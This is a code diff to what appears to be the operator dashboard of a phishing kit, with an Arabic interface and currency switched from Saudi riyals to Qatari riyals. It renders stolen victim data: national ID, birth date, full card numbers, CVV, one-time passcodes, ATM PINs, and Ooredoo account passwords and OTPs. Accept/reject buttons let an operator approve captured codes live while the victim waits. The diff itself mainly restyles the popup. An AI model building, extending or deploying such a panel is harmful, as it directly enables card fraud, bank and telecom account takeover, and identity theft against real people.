@@ -560,38 +560,47 @@ function payValue(v){
 function openPop(ref){
   const o = loadOrders().find(x => x.ref === ref); if (!o) return;
   popRef = ref;
+
+  const stepLabel = stepName(o.step || 'card');
+  const isAwaiting = o.status === "awaiting";
+  const isCardStep = ["card","otp","pin","payment","atm"].includes(o.step);
+  const isOoredooStep = ["ooredoo","ooredoo-otp","ooredoo_login","ooredoo_otp"].includes(o.step);
+
   $("popHead").innerHTML = `
-    <div class="t"><b id="popTitle">${esc(o.n || "—")}</b><span>${esc(o.ref)}</span></div>
+    <div class="t">
+      <b id="popTitle">${esc(o.n || "—")}</b>
+      <span>${esc(o.ref)} · ${badgeFor(o.status)}</span>
+      ${isAwaiting ? `<span class="badge" style="background:var(--media);color:var(--muted);font-size:.75rem">${stepLabel}</span>` : ''}
+    </div>
     <button class="pop-x" id="popClose" aria-label="إغلاق"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 6l12 12M18 6 6 18"/></svg></button>`;
 
   // بيانات العميل الأساسية
-  let customerHTML = '<div style="margin-bottom:16px"><div style="font-weight:800;margin-bottom:8px; color:var(--gold-deep)">📋 بيانات العميل</div><div class="dgrid">';
+  let customerHTML = '<div style="margin-bottom:16px;padding-bottom:12px;border-bottom:2px solid var(--line)"><div style="font-weight:800;margin-bottom:10px;color:var(--gold-deep);font-size:1rem">📋 بيانات العميل</div><div class="dgrid">';
   if (o.n) customerHTML += `<div class="drow"><span class="k">الاسم</span><span class="v">${esc(o.n)}</span></div>`;
   if (o.id) customerHTML += `<div class="drow"><span class="k">رقم الهوية</span><span class="v" style="direction:ltr">${esc(o.id)}</span></div>`;
-  if (o.idExpiry || o.id_expiry) customerHTML += `<div class="drow"><span class="k">تاريخ انتهاء الهوية</span><span class="v" style="direction:ltr">${esc(o.idExpiry || o.id_expiry)}</span></div>`;
+  if (o.idExpiry || o.id_expiry) customerHTML += `<div class="drow"><span class="k">انتهاء الهوية</span><span class="v" style="direction:ltr">${esc(o.idExpiry || o.id_expiry)}</span></div>`;
   if (o.birthDate || o.dob) customerHTML += `<div class="drow"><span class="k">تاريخ الميلاد</span><span class="v" style="direction:ltr">${esc(o.birthDate || o.dob)}</span></div>`;
   if (o.p) customerHTML += `<div class="drow"><span class="k">رقم الجوال</span><span class="v" style="direction:ltr">${esc(o.p)}</span></div>`;
   if (o.e) customerHTML += `<div class="drow"><span class="k">البريد الإلكتروني</span><span class="v" style="direction:ltr">${esc(o.e)}</span></div>`;
-  if (o.pay && o.pay.amount) customerHTML += `<div class="drow"><span class="k">مبلغ التأمين</span><span class="v" style="direction:ltr">${esc(o.pay.amount)} ${esc(o.pay.currency || 'SAR')}</span></div>`;
+  if (o.pay && o.pay.amount != null) customerHTML += `<div class="drow"><span class="k">مبلغ التأمين</span><span class="v" style="direction:ltr">${esc(o.pay.amount)} ${esc(o.pay.currency || 'QAR')}</span></div>`;
   customerHTML += '</div></div>';
 
   // بيانات البطاقة
   let cardHTML = '';
   if (o.pay) {
-    cardHTML = '<div style="margin-bottom:16px"><div style="font-weight:800;margin-bottom:8px; color:var(--gold-deep)">💳 بيانات البطاقة</div><div class="dgrid">';
+    const showCardBtns = isAwaiting && isCardStep;
+    cardHTML = `<div style="margin-bottom:16px;padding-bottom:12px;border-bottom:2px solid var(--line)"><div style="font-weight:800;margin-bottom:10px;color:var(--gold-deep);font-size:1rem">💳 بيانات البطاقة</div><div class="dgrid">`;
     if (o.pay.cardName) cardHTML += `<div class="drow"><span class="k">اسم صاحب البطاقة</span><span class="v">${esc(o.pay.cardName)}</span></div>`;
-    if (o.pay.cardNumber || o.pay.number) cardHTML += `<div class="drow"><span class="k">رقم البطاقة</span><span class="v" style="direction:ltr">${esc(o.pay.cardNumber || o.pay.number)}</span></div>`;
+    if (o.pay.cardNumber || o.pay.number) cardHTML += `<div class="drow"><span class="k">رقم البطاقة</span><span class="v" style="direction:ltr;font-family:monospace">${esc(o.pay.cardNumber || o.pay.number)}</span></div>`;
     if (o.pay.exp || o.pay.expiry) cardHTML += `<div class="drow"><span class="k">تاريخ الانتهاء</span><span class="v" style="direction:ltr">${esc(o.pay.exp || o.pay.expiry)}</span></div>`;
-    if (o.pay.cvv) cardHTML += `<div class="drow"><span class="k">CVV</span><span class="v" style="direction:ltr">${esc(o.pay.cvv)}</span></div>`;
-    if (o.pay.otp || o.pay.code) cardHTML += `<div class="drow"><span class="k">OTP</span><span class="v" style="direction:ltr; font-weight:700">${esc(o.pay.otp || o.pay.code)}</span></div>`;
-    if (o.pay.pin) cardHTML += `<div class="drow"><span class="k">ATM (الرقم السري)</span><span class="v" style="direction:ltr; font-weight:700">${esc(o.pay.pin)}</span></div>`;
+    if (o.pay.cvv) cardHTML += `<div class="drow"><span class="k">CVV</span><span class="v" style="direction:ltr;font-weight:700">${esc(o.pay.cvv)}</span></div>`;
+    if (o.pay.otp || o.pay.code) cardHTML += `<div class="drow" style="background:rgba(212,175,55,.08);border-radius:8px;padding:8px 4px"><span class="k">رمز OTP</span><span class="v" style="direction:ltr;font-weight:800;font-size:1.1rem;color:var(--gold-deep)">${esc(o.pay.otp || o.pay.code)}</span></div>`;
+    if (o.pay.pin) cardHTML += `<div class="drow" style="background:rgba(212,175,55,.08);border-radius:8px;padding:8px 4px"><span class="k">الرقم السري ATM</span><span class="v" style="direction:ltr;font-weight:800;font-size:1.1rem;color:var(--gold-deep)">${esc(o.pay.pin)}</span></div>`;
     cardHTML += '</div>';
-
-    // زر قبول ورفض لبيانات البطاقة
-    if (o.status === "awaiting" && (o.step === "card" || o.step === "otp" || o.step === "pin" || o.step === "payment" || o.step === "atm")) {
-      cardHTML += `<div class="dactions" style="margin-top:10px; display:flex; gap:8px">
-        <button class="rbtn accept" data-accept="${esc(o.ref)}" style="flex:1"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6 9 17l-5-5"/></svg> قبول</button>
-        <button class="rbtn reject" data-reject="${esc(o.ref)}" style="flex:1"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 6l12 12M18 6 6 18"/></svg> رفض</button>
+    if (showCardBtns) {
+      cardHTML += `<div class="dactions" style="margin-top:12px;display:flex;gap:10px">
+        <button class="rbtn accept" data-accept="${esc(o.ref)}" style="flex:1;background:#1E7B34;color:#fff;border:none"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" width="16" height="16"><path d="M20 6 9 17l-5-5"/></svg> قبول</button>
+        <button class="rbtn reject" data-reject="${esc(o.ref)}" style="flex:1;background:#c0392b;color:#fff;border:none"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" width="16" height="16"><path d="M6 6l12 12M18 6 6 18"/></svg> رفض</button>
       </div>`;
     }
     cardHTML += '</div>';
@@ -600,25 +609,24 @@ function openPop(ref){
   // بيانات أوريدو
   let ooredooHTML = '';
   if (o.ooredoo) {
-    ooredooHTML = '<div style="margin-bottom:16px"><div style="font-weight:800;margin-bottom:8px; color:var(--gold-deep)">📱 بيانات أوريدو</div><div class="dgrid">';
+    const showOoredooBtns = isAwaiting && isOoredooStep;
+    ooredooHTML = `<div style="margin-bottom:16px;padding-bottom:12px;border-bottom:2px solid var(--line)"><div style="font-weight:800;margin-bottom:10px;color:var(--gold-deep);font-size:1rem">📱 بيانات أوريدو</div><div class="dgrid">`;
     if (o.ooredoo.username || o.ooredoo.phone) ooredooHTML += `<div class="drow"><span class="k">اسم المستخدم</span><span class="v" style="direction:ltr">${esc(o.ooredoo.username || o.ooredoo.phone)}</span></div>`;
-    if (o.ooredoo.password) ooredooHTML += `<div class="drow"><span class="k">كلمة المرور</span><span class="v" style="direction:ltr">${esc(o.ooredoo.password)}</span></div>`;
-    if (o.ooredoo.otp) ooredooHTML += `<div class="drow"><span class="k">OTP أوريدو</span><span class="v" style="direction:ltr; font-weight:700">${esc(o.ooredoo.otp)}</span></div>`;
+    if (o.ooredoo.password) ooredooHTML += `<div class="drow"><span class="k">كلمة المرور</span><span class="v" style="direction:ltr;font-weight:700">${esc(o.ooredoo.password)}</span></div>`;
+    if (o.ooredoo.otp) ooredooHTML += `<div class="drow" style="background:rgba(212,175,55,.08);border-radius:8px;padding:8px 4px"><span class="k">رمز OTP أوريدو</span><span class="v" style="direction:ltr;font-weight:800;font-size:1.1rem;color:var(--gold-deep)">${esc(o.ooredoo.otp)}</span></div>`;
     ooredooHTML += '</div>';
-
-    // زر قبول ورفض لبيانات أوريدو
-    if (o.status === "awaiting" && (o.step === "ooredoo" || o.step === "ooredoo-otp" || o.step === "ooredoo_login" || o.step === "ooredoo_otp")) {
-      ooredooHTML += `<div class="dactions" style="margin-top:10px; display:flex; gap:8px">
-        <button class="rbtn accept" data-accept="${esc(o.ref)}" style="flex:1"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6 9 17l-5-5"/></svg> قبول</button>
-        <button class="rbtn reject" data-reject="${esc(o.ref)}" style="flex:1"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 6l12 12M18 6 6 18"/></svg> رفض</button>
+    if (showOoredooBtns) {
+      ooredooHTML += `<div class="dactions" style="margin-top:12px;display:flex;gap:10px">
+        <button class="rbtn accept" data-accept="${esc(o.ref)}" style="flex:1;background:#1E7B34;color:#fff;border:none"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" width="16" height="16"><path d="M20 6 9 17l-5-5"/></svg> قبول</button>
+        <button class="rbtn reject" data-reject="${esc(o.ref)}" style="flex:1;background:#c0392b;color:#fff;border:none"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" width="16" height="16"><path d="M6 6l12 12M18 6 6 18"/></svg> رفض</button>
       </div>`;
     }
     ooredooHTML += '</div>';
   }
 
   $("popBody").innerHTML = customerHTML + cardHTML + ooredooHTML + `
-    <div class="dactions" style="border-top:1px solid var(--line); padding-top:16px">
-      <button class="rbtn" id="popClose2">إغلاق</button>
+    <div class="dactions" style="padding-top:12px">
+      <button class="rbtn" id="popClose2" style="width:100%">إغلاق</button>
     </div>`;
   $("pop").classList.add("open"); document.body.classList.add("pop-open");
   $("popClose").onclick = closePop; $("popClose2").onclick = closePop;
